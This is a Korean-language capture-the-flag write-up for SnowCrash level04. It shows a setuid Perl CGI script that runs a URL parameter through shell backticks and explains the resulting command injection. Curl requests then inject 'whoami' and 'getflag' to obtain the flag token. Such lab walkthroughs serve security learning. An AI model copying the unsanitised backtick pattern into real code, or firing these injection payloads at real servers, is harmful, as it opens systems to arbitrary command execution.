# Level04

## level04.pl

```zsh
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
level04@SnowCrash:~$ cat level04.pl
```

```pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

이 스크립트는 Perl로 작성된 CGI(Common Gateway Interface) 스크립트입니다. 이것은 웹 서버와 같은 원격 컴퓨터의 외부에서 실행됩니다. 이 스크립트는 웹 브라우저를 통해 실행되어, GET 또는 POST 요청 매개 변수를 가져와서 x() 함수를 호출합니다.

x() 함수는 매개 변수로 전달된 값을 $y 변수에 저장하고, echo 명령어를 통해 $y 변수를 출력합니다. 여기서 2>&1은 표준 오류 출력을 표준 출력으로 리다이렉션합니다.

따라서, level04.pl 스크립트는 사용자가 전달한 매개 변수를 출력하는 것이며, 매개 변수에는 임의의 쉘 명령어를 전달할 수 있습니다. 이것은 명령어 인젝션 취약점으로 이어질 수 있습니다.

## 매개변수 보내기

```zsh
curl localhost:4747/?x=<parameter>
```

```zsh
level04@SnowCrash:~$ curl "http://localhost:4747?x=\`whoami\`"
flag04
level04@SnowCrash:~$ curl "http://localhost:4747?x=\`getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$ su level05
Password: 
level05@SnowCrash:~$ 
```
